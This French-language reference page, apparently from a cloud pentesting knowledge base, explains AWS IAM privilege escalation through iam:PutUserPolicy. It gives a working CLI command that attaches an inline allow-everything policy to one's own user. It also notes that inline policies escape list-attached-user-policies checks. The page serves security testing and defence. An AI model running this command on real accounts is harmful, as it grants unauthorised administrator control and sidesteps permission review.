---
title: "PutUserPolicy : intégrer en ligne une politique autorisant tout sur votre utilisateur"
description: "iam:PutUserPolicy pour intégrer en ligne une politique autorisant tout directement sur un utilisateur que vous contrôlez."
keywords:
  - PutUserPolicy
  - inline policy
  - user
  - allow-all
  - policy
---

# PutUserPolicy

`iam:PutUserPolicy` écrit une politique **en ligne** directement sur un utilisateur, sans politique managée. Intégrez en ligne une instruction autorisant tout sur votre propre utilisateur et vous êtes administrateur, l'octroi vivant sur l'utilisateur plutôt que comme un objet attachable distinct.

## Intégrer en ligne les droits admin

```bash
aws iam put-user-policy --user-name <you> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

## Notes d'exploitation

- Les politiques en ligne n'apparaissent pas dans `list-attached-user-policies` ; elles se lisent avec `list-user-policies` et `get-user-policy`.
- Ceci ne requiert que `iam:PutUserPolicy`, aucune permission de création de politique.

## Outils

- **AWS CLI** (`iam put-user-policy`).
- **Pacu** (`iam__privesc_scan`).

## Références

- [Rhino Security Labs : élévation de privilèges AWS (PutUserPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
